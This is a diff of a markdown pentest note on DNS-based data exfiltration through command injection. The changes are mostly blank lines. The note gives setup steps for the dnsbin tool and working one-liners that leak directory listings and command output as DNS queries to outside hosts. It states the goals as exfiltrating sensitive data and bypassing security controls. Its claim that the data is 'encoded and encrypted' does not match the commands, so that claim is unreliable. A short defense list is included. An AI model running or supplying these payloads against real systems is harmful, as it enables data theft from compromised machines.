@@ -37,6 +37,8 @@ DNS based data exfiltration is a technique used by attackers to bypass network s
 
 To perform DNS based data exfiltration with command injection, the attacker uses a tool like dnsbin to set up a DNS server that will receive the exfiltrated data. The attacker then injects commands into the target system to exfiltrate the desired data over DNS queries. The data is encoded and encrypted to avoid detection by security controls. This attack can be used to exfiltrate sensitive data such as passwords, credit card information, and intellectual property.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable system with a command injection vulnerability
@@ -47,6 +49,8 @@ To perform DNS based data exfiltration with command injection, the attacker uses
 
 1. Knowledge of commands to execute on the target system
 
+ 
+
 ## Defense
 
 1. Implement input validation to prevent command injection vulnerabilities
@@ -55,19 +59,31 @@ To perform DNS based data exfiltration with command injection, the attacker uses
 
 1. Implement DNS security controls such as DNSSEC and DNS filtering to prevent exfiltration over DNS
 
+ 
+
 ## Objectives
 
 1. Exfiltrate sensitive data from a compromised system
 
 1. Bypass network security controls
 
+ 
+
 # Instructions
 
 1. 
 
+ 
+
+
+
 **Code**: [[https://github.com/HoLyVieR/dnsbin]]
 
+
+
 > 
+
+
 
 **Command** ([[Clone dnsbin repository]]):
 
@@ -75,11 +91,19 @@ To perform DNS based data exfiltration with command injection, the attacker uses
 git clone https://github.com/HoLyVieR/dnsbin.git
 ```
 
+
+
+
+
 **Command** ([[Change directory to dnsbin]]):
 
 ```bash
 cd dnsbin
 ```
+
+
+
+
 
 **Command** ([[Install requirements]]):
 
@@ -87,20 +111,34 @@ cd dnsbin
 pip install -r requirements.txt
 ```
 
+
+
+
+
 **Command** ([[Start dnsbin server]]):
 
 ```bash
 python dnsbin.py
 ```
 
+
+
 2. 1. Go to http://dnsbin.zhack.ca/
 2. Execute a simple 'ls'
 for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 
+ 
+
+
+
 **Code**: [[1. Go to http://dnsbin.zhack.ca/
 2. Execute a simp]]
 
+
+
 > This command will exfiltrate the output of the 'ls' command by using DNS queries to send the data to the DNS server set up with dnsbin. The data is encoded and encrypted to avoid detection by security controls.
+
+
 
 **Command** ([[Execute ls command]]):
 
@@ -108,9 +146,17 @@ for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 
+
+
 3. $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
 
+ 
+
+
+
 **Code**: [[$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d ']]
+
+
 
 > This command will exfiltrate the output of the 'wget -h' command by using DNS queries to send the data to the DNS server. The data is encoded and encrypted to avoid detection by security controls.
 
@@ -137,3 +183,5 @@ for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 
 - [[Command Injection]]
 - [[DNS based data exfiltration]]
+
+
